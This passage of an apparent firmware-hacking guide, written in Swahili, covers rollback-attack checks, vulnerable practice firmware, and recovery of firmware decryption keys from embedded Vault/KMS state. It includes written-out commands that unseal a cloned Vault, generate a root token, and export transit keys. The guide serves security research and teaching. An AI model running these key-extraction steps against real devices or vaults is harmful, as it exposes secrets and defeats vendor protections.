* Je, metadata ya uamilishaji wa slot **imeunganishwa na digest/toleo la firmware lililothibitishwa**, au slot inaweza kurekebishwa baada ya kuteuliwa?
* Baada ya kubadilisha slot kwa mafanikio, je, kifaa hulazimishwa kuwasha upya, au routine za baadaye za update/kufuta bado zinaweza kufikiwa ndani ya session hiyo hiyo?
* Je, msimbo wa userland hufanya ukaguzi wa ziada wa uhalali (kwa mfano, ramani ya partition inayoruhusiwa, nambari ya modeli)?
* Je, mifumo ya *partial* au *backup* ya update hutumia tena mantiki ileile ya uthibitishaji?

> 💡 Ikiwa mojawapo ya yaliyo hapo juu haipo, huenda platform iko katika hatari ya mashambulizi ya rollback.

## Firmware dhaifu za kufanya mazoezi

Ili kufanya mazoezi ya kugundua udhaifu kwenye firmware, tumia miradi ifuatayo ya firmware dhaifu kama mwanzo.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kurejesha funguo za decryption za firmware kutoka kwenye hali ya KMS/Vault iliyopachikwa

Image ya update inapochanganya metadata ndogo iliyo wazi na blob kubwa yenye entropy nyingi, kagua muundo wa container kabla ya kujaribu brute-force chochote:<sup>[[1]](#references)</sup>

- Dump headers, offsets na mipaka ya mistari kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d` na `binwalk -E`.
- `Salted__` kwa kawaida huashiria format ya OpenSSL `enc`: bytes 8 zinazofuata ni salt, na bytes zilizobaki ni ciphertext.
- Field ya Base64 inayodecode kuwa bytes `256` hasa ni kidokezo kikubwa kwamba unaangalia ciphertext ya RSA-2048 inayofunga nenosiri nasibu la firmware/ufunguo wa session.
- Nyenzo ya PGP iliyotenganishwa iliyo kwenye faili hiyo hiyo mara nyingi hulinda uhalisi pekee; usidhani ndiyo njia ya kulinda usiri.

Ikiwa kutafuta funguo tuli (`grep`, `strings`, utafutaji wa PEM/PGP) hakufanikiwi, fanya reverse engineering ya **njia halisi ya decryption** badala ya kutafuta private keys pekee:

- Decompile binary ya updater / usimamizi na fuatilia ni nani anayesoma blob iliyosimbwa, helper/API gani inayoifungua, na jina la kimantiki la ufunguo linaloombwa.
- Tafuta hali ya KMS kwenye root filesystem iliyotolewa (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts.
- Chukulia maandishi yaliyo wazi ya `vault operator unseal ...`, recovery keys, bootstrap tokens, au scripts za local KMS auto-unseal kuwa sawa na nyenzo za private key.

Ikiwa kifaa kina binary asilia ya Vault na storage backend, kwa kawaida ni rahisi zaidi kuendesha tena mazingira hayo kuliko kutekeleza upya mambo ya ndani ya Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Ukiwa na root kwenye KMS iliyoklonishwa:

- Fanya transit keys ziweze kuhamishwa nje ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Hamisha unwrap key: `vault read transit/export/encryption-key/<name>`
- Jaribu RSA key iliyopatikana kwa jozi halisi ya padding/hash inayotumiwa na KMS. Kushindwa kwa decryption ya PKCS#1 v1.5 na kushindwa kwa decryption chaguomsingi ya OAEP **hakuthibitishi** kwamba key si sahihi; mifumo mingi inayotumia Vault hutumia OAEP yenye SHA-256, ilhali maktaba za kawaida hutumia SHA-1 kwa chaguomsingi.
- Ikiwa payload inaanza na `Salted__`, fuata KDF ya OpenSSL ya vendor kikamilifu (`EVP_BytesToKey`, mara nyingi MD5 kwenye vifaa vya zamani) kabla ya kujaribu AES-CBC decryption.

Hii hubadilisha tatizo la "firmware iliyosimbwa kwa njia fiche" kuwa tatizo la jumla zaidi: **rejesha operational keys za upande wa kifaa, kisha urudie hasa vigezo vya unwrap + KDF ukiwa offline**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
